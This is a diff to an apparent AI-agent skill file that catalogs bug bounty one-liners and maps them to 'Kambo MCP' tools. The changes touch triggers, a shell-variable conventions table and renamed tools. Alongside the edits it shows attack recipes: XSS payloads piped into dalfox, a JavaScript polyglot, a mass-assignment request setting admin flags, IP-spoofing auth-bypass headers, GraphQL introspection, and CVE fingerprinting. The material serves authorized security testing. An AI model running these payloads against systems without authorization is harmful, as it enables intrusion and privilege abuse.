@@ -2,15 +2,15 @@
 name: kambo-kingrecon
 description: Curated catalog of bug bounty one-liners from KingOfBugBountyTips, mapped to Kambo MCP tools. Use when the operator asks for proven recon/exploitation recipes (subdomain enum, JS secret hunting, XSS/SQLi/SSRF pipelines, content discovery, API security, CVE-2025/2026 detection, certstream monitoring, ASN/cert intel).
 triggers:
-  - king recon
   - kingofbugbounty
   - kingrecon
-  - one-liner
-  - oneliner
-  - recipe
-  - bug bounty technique
-  - certstream
-  - waybackurls pipeline
+  - king recon
+  - ofjaaah
+  - bug bounty oneliner
+  - king of bugbounty
+  - technique catalog
+  - certstream pipeline
+  - tlsx pipeline
 ---
 
 # Kambo KingRecon — Curated One-Liner Catalog
@@ -34,6 +34,29 @@ Use this skill when the operator:
 - Wants a specific recipe (certstream monitor, JS secret hunt, SSRF chain)
 - Asks how to detect a CVE-2025/2026 vuln class
 - Needs a fallback when a Kambo tool returns thin results
+
+## Conventions used in this catalog
+
+One-liners below assume the same shell variables and intermediate files
+across sections. Set or produce them once per session:
+
+| Symbol | Meaning |
+|--------|---------|
+| `$T` | Root target domain (e.g. `example.com`). Set with `export T=example.com`. |
+| `$ORG` | Organization name for ASN / GitHub dorks (e.g. `Acme Corp`). |
+| `subs.txt` | All discovered subdomains, one per line. |
+| `alive.txt` | Subdomains that responded to `httpx` (live HTTP hosts). |
+| `urls.txt` | Crawled / wayback URLs (full URLs with paths and query strings). |
+| `js.txt` | URLs of `.js` files extracted from crawling. |
+| `params.txt` | Parameter wordlist (e.g. SecLists `burp-parameter-names.txt`). |
+| `wordlist.txt` | Content-discovery wordlist (e.g. SecLists `raft-medium-directories.txt`). |
+| `resolvers.txt` | Trusted DNS resolvers (e.g. `trickest/resolvers/resolvers-trusted.txt`). |
+
+Tools assumed to be on `$PATH` inside the Kambo Docker container:
+`subfinder`, `amass`, `assetfinder`, `findomain`, `chaos`, `httpx`,
+`dnsx`, `tlsx`, `katana`, `gau`, `waybackurls`, `gf`, `qsreplace`, `uro`,
+`anew`, `nuclei`, `dalfox`, `ffuf`, `feroxbuster`, `arjun`, `jq`, `curl`,
+`certstream`, `shodan`.
 
 ## Operating principles
 
@@ -61,7 +84,7 @@ findomain + crt.sh, then `httpx` for liveness, then `anew` for dedup.
 already cross-validates and tags each subdomain with its sources, plus runs
 wildcard detection. Prefer this over the raw chain.
 
-Raw fallback when you need findomain/chaos/assetfinder which Kambo doesn't run:
+Raw fallback when you need findomain/chaos/assetfinder, which Kambo doesn't run:
 ```bash
 (subfinder -d $T -all -silent; assetfinder -subs-only $T; findomain -t $T -q; chaos -d $T -silent; curl -s "https://crt.sh/?q=%25.$T&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g') | sort -u | httpx -silent -threads 100 | anew alive.txt
 ```
@@ -172,7 +195,7 @@ cat js.txt | xargs -I@ curl -s @ | grep -oE "[\"\'][/][a-zA-Z0-9_/-]*(admin|dash
 | Reflected param discovery | `cat urls.txt \| kxss 2>/dev/null \| grep -v "Not Reflected"` | `vuln_xss` |
 | Dalfox pipe | `cat urls.txt \| gf xss \| uro \| qsreplace '"><svg onload=confirm(1)>' \| dalfox pipe --silence` | `vuln_xss` |
 | Airixss confirm | `... \| airixss -payload "confirm(1)"` | `vuln_xss` |
-| Nuclei DAST | `nuclei -l urls.txt -dast -t dast/vulnerabilities/xss/ -rl 50` | `vuln_nuclei_scan` |
+| Nuclei DAST | `nuclei -l urls.txt -dast -t dast/vulnerabilities/xss/ -rl 50` | `scan_vulns` |
 | Polyglot | `qsreplace "jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"` | manual |
 
 ### SQL injection
@@ -240,9 +263,9 @@ cat alive.txt | xargs -P50 -I{} sh -c 'echo {} | waybackurls & echo {} | gau --t
 | GraphQL introspection | `curl -s $T/graphql -d '{"query":"{__schema{types{name}}}"}' -H "Content-Type: application/json"` | `api_test_misconfig` |
 | BOLA candidates | `grep -oE "(id\|user_id\|account_id\|uid)=[0-9]+"` | `api_test_bola` |
 | BFLA / role bypass | header injection (`X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`) | `api_test_bfla` |
-| Mass assignment | `curl -X POST -d '{"admin":true,"role":"admin","isAdmin":true,"is_admin":1}'` | `api_test_bopla` |
-| API method fuzz | for each in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE | `api_test_resource` |
-| Auth bypass headers | `X-Originating-IP / X-Forwarded-For / X-Remote-IP / X-Remote-Addr: 127.0.0.1` | `api_test_auth` |
+| Mass assignment | `curl -X POST -d '{"admin":true,"role":"admin","isAdmin":true,"is_admin":1}'` | manual (no MCP tool yet) |
+| API method fuzz | for each in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE | manual (no MCP tool yet) |
+| Auth bypass headers | `X-Originating-IP / X-Forwarded-For / X-Remote-IP / X-Remote-Addr: 127.0.0.1` | manual (no MCP tool yet) |
 
 ---
 
@@ -263,7 +286,7 @@ cat alive.txt | xargs -P50 -I{} sh -c 'echo {} | waybackurls & echo {} | gau --t
 
 KingOfBugBountyTips maintains fingerprint + version-check recipes for
 fresh high-severity CVEs. These are detection-only; Kambo's
-`vuln_nuclei_scan` should always be the executor (loads the official
+`scan_vulns` should always be the executor (loads the official
 template with evidence grading).
 
 | CVE | Product | Severity | Detection signal |
@@ -281,7 +304,7 @@ Detection one-liner template (n8n example):
 subfinder -d $T -silent | httpx -silent | xargs -I@ -P30 sh -c 'curl -s "@/rest/settings" 2>/dev/null | grep -q "versionCli" && echo "[N8N] @"' | nuclei -t http/cves/2026/CVE-2026-21858.yaml -silent
 ```
 
-→ **Always run** the matching Nuclei template via `vuln_nuclei_scan` after
+→ **Always run** the matching Nuclei template via `scan_vulns` after
 fingerprinting — that's what produces a CONFIRMED-grade evidence chain.
 
 ---
